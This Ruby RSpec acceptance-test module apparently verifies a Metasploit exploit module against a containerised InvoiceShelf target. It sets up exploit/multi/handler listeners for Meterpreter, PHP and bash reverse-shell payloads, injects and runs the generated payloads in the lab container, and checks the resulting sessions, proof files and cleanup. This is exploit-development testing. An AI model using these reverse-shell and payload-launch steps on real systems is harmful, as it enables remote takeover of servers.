# frozen_string_literal: true

require_relative 'acceptance'

# Native handler calibration precedes each real owner payload family.
module InvoiceShelfSessions
  include InvoiceShelfTarget

  FAMILIES = {
    'staged' => [0, 'php/meterpreter/reverse_tcp', 'meterpreter'],
    'inline' => [0, 'php/meterpreter_reverse_tcp', 'meterpreter'],
    'php-shell' => [0, 'php/reverse_php', 'shell'],
    'bash-shell' => [1, 'cmd/unix/reverse_bash', 'shell']
  }.freeze

  def rc_resource_roles
    %w[target reporting_db]
  end

  def process_state
    output, = rc_command('process-state', 'target', 'php', '/opt/module-target-process_state.php')
    state = JSON.parse(output)
    health = "php -r $json=json_decode(@file_get_contents('http://127.0.0.1:8080/api/v1/app/version'),true);exit(is_array($json)&&isset($json['version'])?0:1);"
    state.fetch('processes').reject! do |row|
      row.fetch('command') == health || row.values_at('uid', 'ppid', 'command') == ['0', 0, 'runc init']
    end
    state
  end

  def session_rows
    raise ArgumentError, 'Invalid workspace' unless @workspace.match?(/\Ainvoiceshelf_[0-9_]+\z/)

    JSON.parse(rc_sql("SELECT coalesce(json_agg(row_to_json(session) ORDER BY session.id),'[]'::json) FROM sessions session JOIN hosts host ON host.id=session.host_id JOIN workspaces workspace ON workspace.id=host.workspace_id WHERE workspace.name='#{@workspace}'"))
  end

  def idle
    expect(rc_json('framework.sessions.keys')).to eq([])
    expect(rc_json('framework.jobs.keys')).to eq([])
    expect(session_rows).to all(include('closed_at' => be_a(String))) if @workspace
    state = process_state
    @rc[:states] << { phase: 'idle', state: state }
    rc_save
    expect(state.fetch('connections')).to eq([])
    expect(state.fetch('processes').map { |row| row.except('state') }).to eq(@baseline.fetch('processes').map { |row| row.except('state') })
    true
  end

  def settled
    deadline = Process.clock_gettime(Process::CLOCK_MONOTONIC) + 15
    loop do
      begin
        return idle
      rescue RSpec::Expectations::ExpectationNotMetError
        raise if Process.clock_gettime(Process::CLOCK_MONOTONIC) >= deadline
      end
      IO.select([], nil, nil, 0.15)
    end
  end

  def callback_control
    server = TCPServer.new('0.0.0.0', 4492)
    token = 'invoiceshelf-' + Rex::Text.rand_text_alphanumeric(24)
    command = target_runtime.fetch('compose') + ['exec', '-T', 'target', 'php', '/opt/module-target-callback.php', token]
    task = Thread.new { Open3.capture3(*command) }
    task.report_on_exception = false
    raise Timeout::Error, 'No native callback' unless IO.select([server], nil, nil, 8)

    peer = server.accept
    identity = JSON.parse(Timeout.timeout(5) { peer.gets })
    expect(identity).to include('token' => token, 'uid' => 33)
    state = process_state
    expect(state.fetch('processes')).to include(include('pid' => identity.fetch('pid'), 'ppid' => identity.fetch('ppid'), 'uid' => '33'))
    expect(state.fetch('connections')).to include(include('state' => '01'))
    @rc[:callback] = { identity: identity, observed: state }
    peer.puts('ACK:' + token)
    peer.close
    output, error, status = Timeout.timeout(15) { task.value }
    @rc[:callback].merge!(stdout: output, stderr: error, exit: status.exitstatus)
    expect(status.success?).to be(true), output + error
    expect(JSON.parse(output)).to eq(identity)
    @listener_host = identity.fetch('host')
    settled
  ensure
    peer&.close unless peer&.closed?
    server&.close
    task&.join(15)
    rc_save
  end

  def await_session(payload, owner)
    rc_poll(45) do
      ready = File.readlines(@ready.fetch('ready_event_path')).filter_map do |line|
        JSON.parse(line).fetch('id')
      rescue JSON::ParserError
        nil
      end
      rc_json('framework.sessions.map{|id,session|{id:id,type:session.type,owner:session.via_exploit,payload:session.via_payload,db_id:session.db_record&.id}}').find do |row|
        ready.include?(row.fetch('id')) && row['db_id'] && row['owner'] == owner && row['payload'] == 'payload/' + payload
      end
    end
  end

  def use_session(family, attempt, owner)
    _target, payload, type = FAMILIES.fetch(family)
    metadata = await_session(payload, owner)
    attempt[:metadata] = metadata
    identifier = metadata.fetch('id')
    expect(metadata.fetch('type')).to eq(type)
    path = "/tmp/module-target-invoiceshelf-session-#{Process.pid}-#{identifier}"
    expect(file(path)).to include('exists' => false)
    proof = rc_json("InvoiceShelfSessionControl.proof(framework,#{identifier},#{path.inspect},'invoiceshelf-session',#{family == 'php-shell'})")
    attempt[:proof] = proof
    expect(file(path)).to eq('exists' => true, 'uid' => 33, 'base64' => Base64.strict_encode64('invoiceshelf-session'))
    state = process_state
    process = state.fetch('processes').find { |row| row.fetch('pid') == proof.fetch('pid') }
    expect(process).to include('uid' => '33')
    expect(@baseline.fetch('processes').map { |row| row.fetch('pid') }).not_to include(process.fetch('pid'))
    expect(state.fetch('connections')).to include(include('state' => '01'))
    expect(http('/api/v1/app/version').code).to eq('200')
    attempt[:live_state] = state
    attempt[:open_reports] = session_rows
    expect(attempt.fetch(:open_reports)).to include(include('id' => metadata.fetch('db_id'), 'via_exploit' => owner, 'via_payload' => 'payload/' + payload, 'closed_at' => nil))
    attempt[:shutdown] = rc_json("InvoiceShelfSessionControl.shutdown(framework,#{identifier})")
    rc_poll(15) { process_state.fetch('processes').none? { |row| row.values_at('pid', 'birth') == process.values_at('pid', 'birth') } }
    rc_json("framework.sessions[#{identifier}]&.kill;true")
    console_command('jobs -K')
    settled
    attempt[:closed_reports] = session_rows
    expect(attempt.fetch(:closed_reports)).to include(include('id' => metadata.fetch('db_id'), 'closed_at' => be_a(String)))
  ensure
    if path
      rc_command('remove-session-proof', 'target', 'rm', '-f', '--', path)
      expect(file(path)).to include('exists' => false)
    end
    rc_save
  end

  def cleanup_session
    console_command('sessions -K')
    console_command('jobs -K')
    settled
  end

  def native_session(family)
    _target, payload, = FAMILIES.fetch(family)
    attempt = { family: family, owner: 'exploit/multi/handler', payload: payload }
    @rc[:attempts] << attempt
    source = "/tmp/module-target-invoiceshelf-native-#{Process.pid}-#{family}"
    log_path = source + '-output'
    expect(file(source)).to include('exists' => false)
    console_command('back')
    console_command('use exploit/multi/handler')
    { 'PAYLOAD' => payload, 'LHOST' => @listener_host, 'LPORT' => 4492, 'ReverseListenerBindAddress' => '0.0.0.0', 'ExitOnSession' => false, 'ListenerTimeout' => 60 }.merge(FAMILIES.fetch(family)[2] == 'meterpreter' ? { 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 } : {}).each do |key, value|
      expect(console_command("set #{key} #{value}")).not_to include('Unknown datastore option')
    end
    attempt[:handler_output] = console_command('run -j -z')
    expect(attempt.fetch(:handler_output)).not_to include('Exploit failed', 'Exploit aborted')
    generated = rc_json("begin;job=framework.jobs.values.find{|entry|entry.ctx.first.fullname=='exploit/multi/handler'};raise 'No handler' unless job;handler,instance=job.ctx;{payload:instance.refname,encoded:Base64.strict_encode64(handler.payload.encoded)};end")
    expect(generated.fetch('payload')).to eq(payload)
    attempt[:generated] = generated
    code = Base64.strict_decode64(generated.fetch('encoded'))
    output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', 'target', 'sh', '-c', 'cat > "$1"; chmod 600 "$1"; sha256sum "$1"', 'native-script', source, stdin_data: code)
    expect(status.success?).to be(true), error
    expect(output.split.first).to eq(Digest::SHA256.hexdigest(code))
    launch = family == 'bash-shell' ? ['sh', source] : ['php', '-r', 'eval(file_get_contents($argv[1]));', source]
    output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', '-d', 'target', 'sh', '-c', 'output=$1; shift; exec "$@" > "$output" 2>&1', 'native-launch', log_path, *launch)
    attempt[:launch] = { argv: launch, stdout: output, stderr: error, exit: status.exitstatus }
    expect(status.success?).to be(true), error
    use_session(family, attempt, 'exploit/multi/handler')
    passed = true
  ensure
    primary = $ERROR_INFO
    attempt[:failure] = { type: primary.class.name, message: primary.message } if primary
    begin
      attempt[:final_process_state] = process_state
      attempt[:process_output] = file(log_path) if log_path
      rc_command('remove-native-script', 'target', 'rm', '-f', '--', source, log_path) if source
      cleanup_session
      @rc[:calibrated] << family if passed
    rescue StandardError, RSpec::Expectations::ExpectationNotMetError => e
      attempt[:cleanup_error] = { type: e.class.name, message: e.message }
      raise unless primary
    ensure
      rc_save
    end
  end

  def owner_session(family)
    target, payload, = FAMILIES.fetch(family)
    2.times do |iteration|
      options = { 'TARGET' => target, 'PAYLOAD' => payload, 'SSL' => false, 'LHOST' => @listener_host, 'LPORT' => 4492, 'ReverseListenerBindAddress' => '0.0.0.0', 'AutoCheck' => iteration.zero?, 'ForceExploit' => false, 'DisablePayloadHandler' => false, 'WfsDelay' => 12, 'HttpClientTimeout' => 3 }.merge(FAMILIES.fetch(family)[2] == 'meterpreter' ? { 'SessionCommunicationTimeout' => 10, 'SessionExpirationTimeout' => 90 } : {})
      select_defaults = family == 'staged' && iteration.zero?
      options = options.except('PAYLOAD') if select_defaults
      options = options.except('TARGET') if select_defaults && family == 'staged'
      attempt = { family: family, owner: InvoiceShelfObservation::OWNER, payload: payload, iteration: iteration, select_defaults: select_defaults, options: options }
      @rc[:attempts] << attempt
      output = run_target_module(InvoiceShelfObservation::OWNER, 'target', options, action: 'run -z', reuse_module: iteration.positive?, allow_errors: true, command_timeout: 50)
      attempt[:output] = output
      selection = rc_json('{object:active_module.object_id,target:active_module.datastore["TARGET"],payload:active_module.datastore["PAYLOAD"]}')
      attempt[:selection] = selection
      expect(selection.fetch('object')).to eq(@owner_selection) if iteration.positive?
      @owner_selection = selection.fetch('object')
      expect(output).not_to include('Exploit failed', 'Exploit aborted')
      use_session(family, attempt, InvoiceShelfObservation::OWNER)
    ensure
      cleanup_session
      rc_save
    end
  end
end
